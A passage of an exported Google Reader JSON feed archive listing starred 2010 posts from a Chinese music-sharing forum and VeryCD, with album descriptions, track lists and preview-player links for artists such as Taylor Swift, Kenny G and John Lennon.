    "timestampUsec" : "1288541812721328",
    "id" : "tag:google.com,2005:reader/item/2f5f074058d3e227",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "Hit*轻音乐大碟" ],
    "title" : "Kenny G &lt;Breathless(欧美版)&gt;补档[Fileserve]",
    "published" : 1288541812,
    "updated" : 1288541812,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-34875.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑介绍：这张专辑是购于美国区的，所以没有BMG公司特向大陆地区发行的一首在国内很红火的&lt;茉莉花&gt;（Jasmine Flower ）\n发布日期： January 01, 1992\n\n在肯尼吉出现之前，萨克斯风一直是流行乐坛的配角，1987 年，肯尼吉的畅销单曲“Songbird”让全球乐迷疯狂爱上萨克斯风这个乐器，萨克斯风正式跃身为流行乐坛的主 .."
    },
    "author" : "corinthian",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541811993",
    "timestampUsec" : "1288541811993481",
    "id" : "tag:google.com,2005:reader/item/8df21b2f4972f0dd",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "Hit*轻音乐大碟" ],
    "title" : "Bandari 班得瑞乐队 &lt;3张精选大碟&gt; [115] 免刀",
    "published" : 1288541811,
    "updated" : 1288541811,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-34974.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "  "
    },
    "author" : "lovezjwr",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541802976",
    "timestampUsec" : "1288541802976758",
    "id" : "tag:google.com,2005:reader/item/d5fdd41ea6e95b82",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "Hit*轻音乐大碟" ],
    "title" : "Canon in D&lt;50 MORE ESSENTIAL&gt;斯图加特&amp;慕尼黑交响乐队版 免刀单曲下载 [115]",
    "published" : 1288541802,
    "updated" : 1288541802,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-35119.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "Canon in D &lt;卡农&gt;！！ 强烈推荐的神曲！ \n\n \n\n专辑曲目    \n \n\n自购证明 \n\n \n\n\n卡农吸引我源自棒子的那部经典煽情片 《我的野蛮女友》第一次让我体会到浪漫的感觉，就是那个车太贤饰演的傻子来学校给全智贤送花的那段。 \n反复看了数遍，不知道为什么很普通的画面却让一直不懂浪漫感觉的我有了第一次 .."
    },
    "author" : "ryo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541698920",
    "timestampUsec" : "1288541698920811",
    "id" : "tag:google.com,2005:reader/item/67dfef88f1ba9c2d",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Taylor Swift &lt;Speak Now - Single&gt;大美女新砖2单 [DB/115]",
    "published" : 1288541698,
    "updated" : 1288541698,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-31536.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "大美女的新单一般都要空降冠军地。  \n  \n回复见地址\n自购us区可以转载，但请注明资源来自oppsu，谢谢。"
    },
    "author" : "butterfly‘",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541653403",
    "timestampUsec" : "1288541653403402",
    "id" : "tag:google.com,2005:reader/item/bdd846287cd04b81",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Trespassers William &lt;Live Session&gt; 好听的民谣女声, 补全你的收藏! EP 第一集!! [DB]",
    "published" : 1288541653,
    "updated" : 1288541653,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-32116.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面 + 专辑曲目: \n\n \n\n发片随笔： \n\n专辑全都上传完了，现在开始分享EP. 不好意思，这张EP的试听网上好像没有。不过喜欢的朋友不要错过了！ \n\n\n\n资源自购，只为Oppsu, 谢绝转载！！"
    },
    "author" : "qinjie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541649545",
    "timestampUsec" : "1288541649545620",
    "id" : "tag:google.com,2005:reader/item/dafc85d96d611754",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Owl City&lt;Fireflies (UK Radio Edit)&gt;只有英国有的独家版本 [DBank]",
    "published" : 1288541649,
    "updated" : 1288541649,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-32122.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "Owl City-Fireflies (UK Radio Edit)只有英国有的独家版本，和美国版有不同\n自购收藏 \n来源 iTunes 英国店 其他地区没有 iTunes Plus AAC256Kbps\n\n\n\n \n\n\n "
    },
    "author" : "princeyee",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541646698",
    "timestampUsec" : "1288541646698120",
    "id" : "tag:google.com,2005:reader/item/56babafa7b549382",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Trespassers William &lt;The Natural Order Of Things&gt; 好听的民谣女声, 补全你的收藏! EP 最后一集!! [DB]",
    "published" : 1288541646,
    "updated" : 1288541646,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-32191.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面 + 专辑曲目: \n\n\n\n发片随笔：\n\n好了，这个好听的民谣歌手的资源全部上传完毕！希望大家能喜欢，好好欣赏吧！！ \n\n试听：\nhttp://www.xiami.com/widget/1435964_1769129617,1769129618,1769129619,1769129620,1769129621,_235_346_d90000_333333/multiPlayer.swf\n\n\n资源自购，只为Oppsu, 谢绝转载！！"
    },
    "author" : "qinjie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541644237",
    "timestampUsec" : "1288541644237122",
    "id" : "tag:google.com,2005:reader/item/9066c4246c2e1065",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Trespassers William &lt;Noble House&gt; 好听的民谣女声, 补全你的收藏! EP 第二集!! [DB]",
    "published" : 1288541644,
    "updated" : 1288541644,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-32187.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面 + 专辑曲目: \n\n \n\n试听： \n<a href=\"http://www.xiami.com/widget/1435964_1769442077,1769442078,1769442079,1769442080,1769442081,1769442082,_235_346_d90000_333333/multiPlayer.swf\">http://www.xiami.com/widget/1435964_1769442077,1769442078,1769442079,1769442080,1769442081,1769442082,_235_346_d90000_333333/multiPlayer.swf</a> \n\n \n资源自购，只为Oppsu, 谢绝转载！！"
    },
    "author" : "qinjie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541629482",
    "timestampUsec" : "1288541629482644",
    "id" : "tag:google.com,2005:reader/item/332cbba331a4ea24",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Taylor Swift &lt;Back To December - Single&gt;小美女10.12最新单曲 [115]",
    "published" : 1288541629,
    "updated" : 1288541629,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-32908.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "由于买得太早专辑封面出了问题，请各位晚点选择获取专辑封面。\n由于不会发图还请回发图的各位前辈帮帮忙。先多谢了！\n\n  \n\n\n<a href=\"http://player.youku.com/player.php/sid/XMjE0MTYzMzA4/v.swf\">http://player.youku.com/player.php/sid/XMjE0MTYzMzA4/v.swf</a>"
    },
    "author" : "cjh9291cjh",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541593896",
    "timestampUsec" : "1288541593896901",
    "id" : "tag:google.com,2005:reader/item/e580e1962e77bb27",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Taylor Swift &lt;Mean- Single&gt;小美女10.19最新单曲 [115]",
    "published" : 1288541593,
    "updated" : 1288541593,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-34251.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "对不起刚才太激动了忘记了按共享，对不起！很抱歉！已经共享了"
    },
    "author" : "cjh9291cjh",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541577135",
    "timestampUsec" : "1288541577135129",
    "id" : "tag:google.com,2005:reader/item/a15da3f193bd7513",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Oh Land &lt;Oh Land - EP&gt;  很美的女声，有试听，19日EP~[DB]",
    "published" : 1288541577,
    "updated" : 1288541577,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-34514.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "http://i.6.cn/cvbnm/53/34/b6/cdcb3069e3a649fa1cdbe8a435269e6b.jpg \nhttp://i.6.cn/cvbnm/f6/57/13/545708065e0647cb0160474dee00cb06.jpg \n相信道长的品位么。相信的话，绝对不会后悔、19日新EP \n\nhttp://disk.kugou.com/player/0/7/0/1/default/200/301419DAF761B2B5/mini.swf"
    },
    "author" : "xsdr",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541548098",
    "timestampUsec" : "1288541548098871",
    "id" : "tag:google.com,2005:reader/item/670788c544309b3e",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "王菲&lt;Eyes on Me - Single&gt;(最终幻想8主题曲)补档 [DB]",
    "published" : 1288541548,
    "updated" : 1288541548,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-35570.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑中文名: Eyes on Me \n歌手: 王菲 \n资源格式:  \n版本: EP \n发行时间: 1999年 \n地区: 香港,日本 \n语言: 普通话,英语 \n\n王菲凭借重庆森林成功抢滩日本市场，既而受到日本游戏商的青睐，主唱了&lt;FINAL FANTASY 8&gt;的主题曲《Eyes on me》。这张单曲亦曾在日本Oricon单曲榜上占据第9位置，是有始以来，华语歌手在此单榜 .."
    },
    "author" : "koko",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541521789",
    "timestampUsec" : "1288541521789454",
    "id" : "tag:google.com,2005:reader/item/63aaaa248c27b70a",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "单曲EP好听分享" ],
    "title" : "Cheryl Cole &lt;Promise This - EP&gt;英国冠军单曲，免刀...附赠一张单曲...[115]",
    "published" : 1288541521,
    "updated" : 1288541521,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-36406.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "英国冠军曲啊，暴好听... \n之前有人发过Remix的，现在是普通EP... \n另附送她的另一张单曲Fight for This Love - Single... \n\nCover: \n \n\nTrack: \n \n\n \n\n\n自购资源，请勿转载 \n\n \n\n \n\n\n<a href=\"http://www.uploadmusic.org/MUSIC/932111287763791.mp3\">http://www.uploadmusic.org/MUSIC/932111287763791.mp3</a>"
    },
    "author" : "zengdezhi",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541501378",
    "timestampUsec" : "1288541501378139",
    "id" : "tag:google.com,2005:reader/item/3f1e66d37e60394a",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "欧美音乐大碟" ],
    "title" : "群星&lt;UnitedKingdom Top 10 Collected&gt;英国10强火辣合辑免刀发布[115]",
    "published" : 1288541501,
    "updated" : 1288541501,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-31224.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面 \n \n*本张专辑 不同歌曲拥有不同封面\n\n发片随语\n本张专辑收录了英国流行音乐排行榜10强曲目\n希望音乐的不要错过了\n免刀发布\n\n曲目\n01. Written in the stars / Tinie Tempah\n02. Just the way you are/ Bruno Mars\n03. Let the sun shine / Labrinth\n04. Teenage Dream / Katy Perry\n05. Dynamite(Original Mix)  .."
    },
    "author" : "admin",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541461983",
    "timestampUsec" : "1288541461983840",
    "id" : "tag:google.com,2005:reader/item/b1effed43819709f",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Channing&lt;Majesty&gt;清新女声缺少一首[115]",
    "published" : 1288541461,
    "updated" : 1288541461,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-24081.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "在自己的硬盘上找到一张专辑坛里没有就发上来了，但是发现缺少了一首歌，怎么找也找不到了，就只能发到EP区。这个歌手大家可能比较陌生，没怎么听到过，但是声线很清新，还是不错的。\n截图1：  \n截图2：  \n截图3： \n\n个人推荐&lt;Heart&gt;\n试听：试听"
    },
    "author" : "x15988649286",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541458302",
    "timestampUsec" : "1288541458302884",
    "id" : "tag:google.com,2005:reader/item/1a310acc94b28fa2",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "欧美音乐大碟" ],
    "title" : "Trespassers William &lt;Anchor&gt; 好听的女声, 推荐! 全集第一集! [115]",
    "published" : 1288541458,
    "updated" : 1288541458,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-31502.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面 + 专辑曲目: \n\n \n\n专辑介绍: \n\n是冲着Butterfly我最爱的Lisa Germano的“Similar Artists”这个名号去听的，不过听后，倒完全没发现哪像Lisa，这个有奇怪名字乐队的风格虽然也是Indie，但和一般的Indie乐队听上去还是有区别的：没有Butterfly不能容忍的那种让人胃酸出来的超忧郁Indie男女的感觉，是我喜欢的那种 .."
    },
    "author" : "qinjie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541385563",
    "timestampUsec" : "1288541385563228",
    "id" : "tag:google.com,2005:reader/item/8e2eb8ed61eb850d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Nightwish&lt;Century Child&gt;补档[115]",
    "published" : 1288541385,
    "updated" : 1288541385,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-31412.html",
      "type" : "text/html"
    } ],
    "author" : "superelnino",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541376493",
    "timestampUsec" : "1288541376493230",
    "id" : "tag:google.com,2005:reader/item/852ae733d090bdff",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Geka &lt;Station&gt;清新女声，很干净[115]",
    "published" : 1288541376,
    "updated" : 1288541376,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-33838.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "【专辑名称】Station\n【专辑歌手】Geka\n\n自购专辑，切勿转载。恶意转载者自重，一旦发现，投诉区投诉！   \nhttp://www.xiami.com/widget/1488632_3260284,3260285,3260286,3260287,3260288,3260289,3260290,3260291,_235_346_FF8719_494949/multiPlayer.swf"
    },
    "author" : "v.o.andrew",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541352621",
    "timestampUsec" : "1288541352621724",
    "id" : "tag:google.com,2005:reader/item/bf3e817d5e111ae1",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "i hate this place&lt;snowlights&gt;适合喜欢owl city音乐类型的朋友们！补档[115]",
    "published" : 1288541352,
    "updated" : 1288541352,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-34989.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "前语:I Hate This Place是来自美国纽约的Sean Nerney的Solo project，专辑的感觉就像将人置身于外太空。顺手触摸那你曾遥不可及的星星，在内部瞻仰浩瀚的宇宙。歌曲排布的整体感比较紧密。一张专辑下来，就貌似是一次奇幻的太空之旅。新奇，欢畅。这张专辑总的来说是张让人听完十分愉快的专辑。轻快的节拍和美妙的旋律加之 .."
    },
    "author" : "esure",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1288541283496",
    "timestampUsec" : "1288541283496484",
    "id" : "tag:google.com,2005:reader/item/23b40da050a2c5d9",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "欧美音乐大碟" ],
    "title" : "Nike 耐克 &lt;Anywhere Anytime: Outdoor Conditioning&gt; 耐克户外运动音乐+精美PDF [115]",
    "published" : 1288541283,
    "updated" : 1288541283,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-35916.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面：\n\n  \n\n专辑曲目：\n\n  \n\nPDF截图：\n\n \n\n简介：\n\n适合户外有氧运动，并且第一首为整轨的，长达 45mins，后面是分规的，音乐中不时有女声提示你运动的细节，更加具体的在Digital Book中有，可以参考\n\n转载的，感谢购买者与分享着\n\n\n\n正版凭证：\n  \n\n\n\n\n下载："
    },
    "author" : "a857692052",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-17.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oopmei.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1286643327230",
    "timestampUsec" : "1286643327230457",
    "id" : "tag:google.com,2005:reader/item/f740f5021b16592c",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "华语音乐大碟 " ],
    "title" : "陈绮贞  &lt;itunes 7张专辑&gt;好听不解释[115]",
    "published" : 1286643327,
    "updated" : 1286643327,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-30132.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : " 资源系自购，转载请注明\n\n\n　陈绮贞，台湾创作歌手。是台湾少有的创作型民谣歌手之一，而且她的歌曲大都由她自己作曲及作词。先后签约魔岩、滚石唱片。03年成立独立音乐室，现为独立音乐人。\n\n\n从一开始在垦丁卖demo（小样）开始，这位土生土长的台湾女生就没有停止过梦想。并且一直用作品刻画着她独特的生命。在边 .."
    },
    "author" : "adrian",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1286643316493",
    "timestampUsec" : "1286643316493270",
    "id" : "tag:google.com,2005:reader/item/4f2969011caeab33",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "华语音乐大碟 " ],
    "title" : "张雨生 &lt;大海&gt; 补档  [115]",
    "published" : 1286643316,
    "updated" : 1286643316,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-31040.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "http://www.oppsu.cn/p_w_upload/photo/Mon_1010/188_8df8128602054084d952a256dd7ed.jpg \nhttp://www.oppsu.cn/p_w_upload/photo/Mon_1010/188_a20c1286020540a95824641dcfc00.png \n\n专辑曲目 \n\n01 我是一棵秋天的树 \n02 I Don&#39;t Wanna Say Goodbye \n03 多梦的岁月 \n04 爱上你的一切 \n05 挣扎 \n06 大海 \n07 宁可让我 .."
    },
    "author" : "v2_ace",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1286602790860",
    "timestampUsec" : "1286602790860129",
    "id" : "tag:google.com,2005:reader/item/d490e17653f23c59",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "John Lennon -《Imagine》[MP3]",
    "published" : 1286592592,
    "updated" : 1286592592,
    "alternate" : [ {
      "href" : "http://www.verycd.com/topics/136679/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<img src=\"http://image-1.verycd.com/629f7bd5221b9013d4a0d84f777f896c19906(280x)/thumb.jpg\" alt=\"John Lennon -《Imagine》[MP3]\" style=\"float:right;padding:0 0 10px 10px\">\n\t\t\t\t专辑英文名: Imagine<br>歌手: John Lennon<br>音乐风格: 流行<br>资源格式: MP3<br>发行时间: 2003年<br>地区: 美国<br>语言: 英语<br>简介: <br>专辑介绍：<br>　　1971年列侬和妻子大野洋子（Yoko Ono）住在英国乡下一幢豪华的别墅里。年初的某一天的早晨，列侬起床后在洋子的陪伴下，写下了《想像》的歌词。其音乐部分则是在他家那架着名的白色钢琴上写成的。<br>　　后来在一次飞行途中，列侬又做了几处修改，在一张纽约希尔顿旅馆的便笺上写下了最后完整的歌词。歌词中没有“爱”或者“自由”这样的字眼，列侬也从没有想到要写一首圣歌（Anthem），但这首歌后来却成了一代人的圣歌。同年6月的某一天，列侬和鼓手Alan White（后Yes乐队的鼓手）和贝司手，德国朋友Klaus Voormann在自家的一间简陋的录音棚内录制了这首歌，列侬亲自弹的钢琴（一架Steinway）。制作人是着名的Phil Spector。他们一共录了3个版本，出现在唱片里的是第2个版本。<br>　　列侬录音一向追求即兴，不惜牺牲准确性。一次他甚至把萨克斯风手吹错了调的伴奏用在了歌曲中。可这次他却格外认真，事先把歌词用大写字母工整地打印好，分发给录音乐手们。Spector后来为歌曲加入了管弦乐伴奏，一点也不喧宾夺主，这大概是Spector做得最好的一次。列侬业也曾试验过加入管风琴，但没有用上。Spector事后回忆说，他抱定决心要做一张能够“流行”的专辑，他没有食言。这张同名专辑于1971年9月9日出版，歌曲《想像》最高升到过公告牌的单曲榜第3名，专辑则最高达到过专辑榜的冠军。列侬评价说：“这首歌曲几乎是共产主义宣言式的，虽然我本人不是共产党员，也不属于任何运动……但是由于它披着一张流行的外衣，所以被大众接受了。我现在知道该怎么做了，只要抹上一点蜜糖，你的主张就可以容易地流传开来。”<br>　　专辑出版后不久，列侬和洋子即移居纽约，但却遭到了美国移民局的阻挠，他们拒绝发给列侬绿卡。列侬和移民局苦斗了4年才获得了美国永久居留权。列侬似乎早有预感，他在歌中唱到：“Imagine there is no country, It isn't hard to do.”在谈到为什么要移居纽约时列侬说：“如果我生在古罗马时代，我就会住在罗马。美国是今天的古罗马帝国，而纽约本身就是罗马城。”1980年，列侬在他的罗马城被一个丧心病狂的歌迷枪杀。这张专辑出版30年零2天后，罗马城本身也遭到了一次严重的打击。<br>　　911事件发生后，美国公众重新唤醒了对这首歌的热情。美国的公众媒体一方面充斥着《星条旗永不落》和《美丽的美国》这类“鼓动战争”的歌曲，另一方面，电台和电视台也接到了无数民众请求播放《想像》的电话，一时间这首歌在美国各地的流行及摇滚乐电台里到处可以听到。在纽约时代广场上方还竖起了一块广告牌，是由洋子花钱买下来的，上书：IMAGINE ALL THE PEOPLE/LIVING LIFE IN PEACE。在为911死难者募捐的义演晚会上，尼尔·扬（Neil Young）演唱了这首歌。当初他接到组委会的邀请后，一时想不出自己有哪首歌合适，还是他的妻子Pegi鼓动扬演唱《想像》。扬对这首歌的处理几乎完全按照列侬的版本，连弦乐部分都没有改动。只有一处：列侬唱的是“Imagine no possessions, I wonder if YOU can,”，扬唱成了“I wonder if I can,”这两人都是音乐界的巨富，这个改动可不是没有意义的！列侬后来解释说：“佛教徒们常说，要在思想上一无所有。简简单单地放弃所有的金钱并不能做到这一点。”<br>　　许多音乐界的名人对这首歌的评价也很有意思。“雄鹰乐队”的唐·汉利（Don 